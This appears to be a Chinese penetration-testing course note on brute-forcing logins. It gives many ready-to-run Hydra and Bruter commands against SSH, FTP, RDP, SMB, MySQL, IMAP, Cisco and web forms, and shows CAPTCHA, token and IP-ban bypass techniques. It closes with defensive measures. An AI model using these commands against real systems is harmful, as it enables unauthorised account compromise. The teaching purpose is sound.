---
layout: post
title: 暴力破解
date: 2026-07-28
tags: 暴力破解 Bruter Hydra pkav
---

# 暴力破解

---

## 考虑的因素

### 准备字典

### 判断用户是否设置了复杂的密码

随便找到一个网站，我们来看一下它注册时有没有密码复杂度的要求，比如有长度要求，8位以上，那么我们设置密码字典的时候就要搞8位以上的密码，所以我们可以找找一个密码字典生成器来搞。

> 💡 **在线字典生成工具推荐：**
>
> - <http://www.wufangbo.com/demo/tool//assets/images/19/index.html>
> - <http://tool.c7sky.com/password/>

### 网站是否有验证码

![验证码示例](/assets/images/19/image-20260728233549484.png)

### 尝试登录的行为次数是否有限制

> ⚠️ **注意：** 你把字典和工具都准备好了，但是暴力登录的时候，输入几次之后，IP就被封了，或者做了频率访问限制，这就不好搞了吧，除非你加了很多的代理，做个代理池，不断地更换IP地址。

### 网站是否有双因素认证、Token值等等

双因素（也叫做双因子）也就是除了用户名和密码之外，还需要输入手机验证码或者插加密狗，那么暴力破解就没用了。Token值也是做验证的，但是 Token 值不能防暴力破解，因为这个值我们通过客户端可以获取到。

---

## C/S 架构暴力破解

> 🎯 **C/S vs B/S：**
>
> - **C/S** — Client / Server，即客户端/服务器
> - **B/S** — Browser / Server，即浏览器/服务器

C/S 即客户端/服务器，基于 C/S 架构的应用程序，如 `ssh`、`ftp`、`sql-server`、`mysql` 等，这些服务往往提供一个高权限的用户，而这个高权限的用户往往可以进行执行命令的操作，如 `sql-server` 的 `sa`，`mysql` 的 `root`，`oracle` 的 `sys` 和 `system` 帐号。使用这些高权限的用户能在很大程度上给开发人员带来方便，但如果口令被破解带来的危害也是相当大的。

**C/S架构主要使用的破解工具：** Hydra、Bruter、X-scan

---

### Bruter

> ⚠️ 路径中不能出现中文或者空格。

工具路径：`D:\BaiduNetdiskDownload\学习工具\8第八阶段渗透测试阶段工具\day55暴力破解\Bruter_1.1\Bruter_1.1`

#### 破解 Windows 2003 的主机用户密码

我们如果爆破 Windows 系统就可以选择使用 SMB 服务的 445 端口，因为 Windows 默认是开启这个端口的；Linux 可以选择 SSH2。

![Bruter爆破Windows](/assets/images/19/image-20260729002816467.png)

---

### 破解 MySQL 数据库

> ⚠️ 一般 MySQL 默认是没有开启远程连接的。先用 `telnet` 测试一下是否开启了。如果测试不成功，说明 MySQL 的 `root` 用户没有远程连接的权限。

端口：MySQL `3306`，其余操作相同。

---

### 破解 Linux 用户名和密码

> ⚠️ `root` 用户默认没有远程连接权限。

端口：SSH `22`，其余操作相同。

---

### Hydra

Hydra 也叫九头蛇，是著名黑客组织 THC 的一款开源的暴力密码破解工具，可以在线破解多种密码。

- 官网：<http://www.thc.org/thc-hydra>

> 💡 **支持协议非常广泛：** AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP 等类型密码。

在 Kali 中已经集成好了，直接使用即可。

**基本语法：**

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] 
server service [OPT]
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `-R` | 继续从上一次进度接着破解 |
| `-S` | 采用 SSL 链接 |
| `-s PORT` | 可通过这个参数指定非默认端口 |
| `-l LOGIN` | 指定破解的用户，对特定用户破解 |
| `-L FILE` | 指定用户名字典 |
| `-p PASS` | 小写，指定密码破解，少用，一般是采用密码字典 |
| `-P FILE` | 大写，指定密码字典 |
| `-e ns` | 可选选项，`n`：空密码试探，`s`：使用指定用户和密码试探 |
| `-C FILE` | 使用冒号分割格式，例如 `登录名:密码` 来代替 `-L`/`-P` 参数 |
| `-M FILE` | 指定目标列表文件，一行一条 |
| `-o FILE` | 指定结果输出文件 |
| `-f` | 在使用 `-M` 参数以后，找到第一对登录名或者密码的时候中止破解 |
| `-t TASKS` | 同时运行的线程数，默认为 16 |
| `-w TIME` | 设置最大超时的时间，单位秒，默认是 30s |
| `-v` / `-V` | 显示详细过程 |
| `server` | 目标 IP |
| `service` | 指定服务名，支持 telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head\|get} http-{get\|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp 等等 |
| `OPT` | 可选项 |

**示例 — `user.txt` 内容：**

```
admin
root
```

> `top100.txt` 我们用过了，里面有 100 个常用密码。

**基本用法：**

```bash
# 使用用户名和密码字典爆破 SSH
hydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh
```

---

**实战命令集：**

```bash
# ===== 破解 SSH =====
# 使用用户字典 + 密码字典
hydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh

# 指定用户名 + 密码字典 + 线程数
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

# 指定用户名 + 密码字典 + 输出到文件
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
```

```bash
# ===== 破解 FTP =====
# 基础爆破
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV

# 带空密码试探
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```

```bash
# ===== GET 方式提交，破解 Web 登录 =====
# 爆破 /admin/ 路径
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/

# 指定具体文件，找到第一个密码后停止（-f）
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```

```bash
# ===== POST 方式提交，破解 Web 登录 =====
# 基本 POST 爆破
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

# 带完整参数说明：
#   -t 3        同时线程数 3
#   -l admin    用户名是 admin
#   -P pass.txt 字典文件
#   -o out.txt  保存结果到 out.txt
#   -f          当破解了一个密码就停止
#   10.36.16.18 目标 IP
#   http-post-form 表示采用 http 的 post 方式提交的表单密码破解
#   <title> 中的内容是表示错误猜解的返回信息提示
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form \
  "login.php:id=^USER^&passwd=^PASS^:wrong username or password"
```

```bash
# ===== 破解 HTTPS =====
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
```

```bash
# ===== 破解 TeamSpeak =====
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
```

```bash
# ===== 破解 Cisco =====
# Cisco 设备
hydra -P pass.txt 10.36.16.18 cisco

# Cisco enable 模式
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
```

```bash
# ===== 破解 SMB =====
hydra -l administrator -P top100.txt 192.168.0.102 smb
```

```bash
# ===== 破解 POP3 / SMTP 等邮件协议 =====
# 在我们自己的 QQ 邮箱设置中就能看到 POP 服务器 IP/域名、端口等
hydra -l muts -P pass.txt my.pop3.mail pop3
```

```bash
# ===== 破解 RDP（3389） =====
# 注意：结果可能存在误报。目前市面上所有暴力破解 3389 的工具基本都有这个问题。
hydra 192.168.13.25 rdp -l administrator -P top100.txt -V
```

```bash
# ===== 破解 HTTP-Proxy =====
hydra -l admin -P pass.txt http-proxy://10.36.16.18
```

```bash
# ===== 破解 IMAP =====
# 用户字典 + 固定密码
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN

# 冒号分割格式 + IPv6
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```

---

## B/S 架构暴力破解

一般是对 Web 应用程序中的高权限用户进行猜解，如网站的内容管理系统账户。一般针对 B/S 的暴力猜解，使用 Burp Suite 镜像表单爆破。

> 💡 **判断依据：** 暴力破解是否成功首先看响应数据的长度，一般成功的响应数据包会有所不同。

---

### 前端校验

前端 JS 代码有验证码校验，验证码验证成功之后，再将数据发送到服务端。发送给服务端的参数中，中间没有这个验证码，服务端并不会对这个验证码进行验证。

> 🎯 **绕过思路：**
> 1. 数据包在 Intruder 攻击器中并不需要验证码这个参数
> 2. 或者在前端页面点击检查，把 JS 代码功能关掉

---

### 后端校验

客户端向服务端发出请求登录，服务端这时候会在服务端生成一个有时效性的验证码，服务端给客户端响应一个登录界面，用户需要输入账号密码和验证码才可以完成登录。

> 💡 **绕过思路：** 我们可以利用验证码的时效性，在有效的时间内进行爆破。

---

### Token 防爆破示例

> 💡 Token 不能防暴力破解，只能防 CSRF。

客户端向服务端请求，服务端响应一个数据包，数据包中有服务端生成的 Token，客户端在下次提交数据的时候，数据包中需要携带这个 Token 值才能完成提交。

我们需要让每次响应回来的 Token 值都自动添加在数据包中。

**操作步骤：**

在设置中找到：

![Burp设置-1](/assets/images/19/image-20260729224723129.png)

点击添加，设置你要获取的 Token：

![Burp设置-2](/assets/images/19/image-20260729225646220.png)

并将 Payload 类型设置为**递归提取**：

![Payload设置-递归提取](/assets/images/19/image-20260729225804539.png)

然后让最大请求数设置为 1，因为你是发一个请求，响应一个新的 Token：

![最大请求数设置](/assets/images/19/image-20260729230803333.png)

---

### pkav 图片验证码绕过

首先用目录扫描工具去找他的后台管理的路径，如 `dirsearch`：

```
http://192.168.239.134:81/admin/
```

验证码是个纯数字的图片验证码，用 F12 可以找到图片位置：

```
http://192.168.239.134:81/admin/safecode.asp?
```

![验证码图片位置](/assets/images/19/image-20260729231428737.png)

我们需要一个图片识别提取工具——它只有识别功能，没有抓包功能，我们需要用 Burp 去抓包，然后复制过来。

工具路径：`D:\BaiduNetdiskDownload\学习工具\8第八阶段渗透测试阶段工具\day55暴力破解\pkav\pkav`

![pkav工具界面](/assets/images/19/image-20260729232723900.png)

**验证码识别：** 识别图片上文字

![验证码识别](/assets/images/19/image-20260729232854948.png)

> ⚠️ 但是不可能每次都能保证识别没有出错。

![识别错误](/assets/images/19/image-20260729233844449.png)

**重放选项：** 当识别到返回指定的错误信息时，自动重新识别，发送请求。

点击发包器，开始爆破：

![发包器爆破](/assets/images/19/image-20260729234408891.png)

---

## 防范暴力破解

防止暴力破解是非常简单的，无论是 B/S 架构或者是 C/S 架构。

### 1. 强制要求输入验证码

否则必须实施 IP 策略：5 次登录不成功直接封 IP。

### 2. 验证码只能用一次

用完立即过期！不能再次使用。

### 3. 验证码不要太弱

扭曲、变形、干扰线条、干扰背景色、变换字体、滑动等。

### 4. 密码的复杂性

毫无疑问，密码设置一定要复杂，这是最基本的、最低层的防线。密码设定一定要有策略：

1. 对于重要的应用，密码长度最低为 8 位数以上，尽量在 8 位数至 16 位数之间
2. 绝不允许以自己的手机号码、邮箱等关键"特征"为密码
3. 用户名与密码不能有任何联系，如用户名为 `admin`，密码为 `admin888`
4. 仅仅以上三点是不够的，比如说 `12345678`、`222222222`、`11111111` 这样的密码，长度够了，但是也极为危险，因为这些即为弱口令，这些密码一般都已经被收录到了攻击者的字典之中。所以就必须增加密码的复杂性：

> 🎯 **密码复杂度方案：**
>
> - 至少一个小写字母（a-z）
> - 至少一个大写字母（A-Z）
> - 至少一个数字（0-9）
> - 至少一个特殊字符（\*&^%$#@!）

### 5. 登录日志（限制登录次数）

使用登录日志可以有效防范暴力破解。登录日志意为：当用户登录时，不是直接进行登录，而是去登录日志里面去查找用户是否已经登录错误了，还有登录错误的次数、时间。如果连续错误，将采取某种措施。

> 💡 **实际案例：** 例如 Oracle 数据库就有一种机制，当密码输入错误三次之后，每次登录时间间隔为 10 秒钟，这样就大大减少了被破解的风险。我们完全可以做到登录第三次错误后延时 10 秒登录，第四五次延时 15 秒，这也是一种有效的解决暴力破解的方案。

---

### 防护措施汇总

| 防护手段 | 具体措施 | 说明 |
|---------|---------|------|
| 验证码 | 强制输入 + 一次性使用 + 高复杂度 | 扭曲、变形、干扰线、滑动验证等 |
| IP 策略 | 5 次失败封 IP | 配合代理池可绕过，但仍是最基础的防线 |
| 密码策略 | 8-16 位 + 大小写 + 数字 + 特殊字符 | 最低层的防线，杜绝弱口令 |
| 登录日志 | 记录失败次数 + 延时惩罚 | 连续失败后逐次增加等待时间 |
| 双因素认证 | 手机验证码 / 加密狗 | 暴力破解直接失效 |
